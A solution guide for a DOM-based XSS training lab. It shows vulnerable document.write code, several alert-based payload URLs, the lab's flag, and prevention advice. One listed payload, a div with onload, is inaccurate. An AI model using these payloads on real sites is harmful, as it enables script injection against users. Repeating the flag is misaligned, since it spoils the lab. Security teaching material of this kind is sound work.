# Solution Guide: DOM XSS Lab

## Lab Objective
Perform a cross-site scripting attack that calls the `alert` function.

## Vulnerability Analysis
The page contains JavaScript code that uses `document.write` with data from `location.search`. The vulnerable code is:

```javascript
const urlParams = new URLSearchParams(window.location.search);
const searchQuery = urlParams.get('search');

// Vulnerable code: using document.write with data from location.search
if (searchQuery) {
    document.write('<div style="position: fixed; top: 10px; right: 10px; background-color: #d4edda; padding: 10px; border: 1px solid #c3e6cb; border-radius: 4px; color: #155724;">You searched for: ' + searchQuery + '</div>');
}
```

This code takes the `search` parameter from the URL and directly writes it to the page using `document.write`, making it vulnerable to DOM-based XSS.

## Solution Steps

1. Navigate to the DOM XSS page
2. Add a search parameter with an XSS payload to the URL:
   ```
   http://[SERVER_IP]:8003/dom_xss.html?search=<script>alert('XSS')</script>
   ```
3. The JavaScript code will execute the payload via `document.write`
4. The alert function will be called, demonstrating the XSS vulnerability

## Alternative Solutions

If the basic script tag is filtered, you can try:

1. Image tag with onerror event:
   ```
   http://[SERVER_IP]:8003/dom_xss.html?search=<img src=x onerror=alert('XSS')>
   ```

2. SVG element with onload event:
   ```
   http://[SERVER_IP]:8003/dom_xss.html?search=<svg onload=alert('XSS')>
   ```

3. Using event handlers:
   ```
   http://[SERVER_IP]:8003/dom_xss.html?search=<div onload=alert('XSS')>Content</div>
   ```

## Flag
The flag for this lab is: `IDS{6326ea06ab28fe9c08cd27189395a62e}`

## Prevention

To prevent this vulnerability, the application should:
1. Avoid using `document.write` with untrusted data
2. Use safer DOM manipulation methods like `textContent` instead of `innerHTML`
3. Sanitize or encode user input before using it in DOM operations
4. Implement Content Security Policy (CSP) to restrict script execution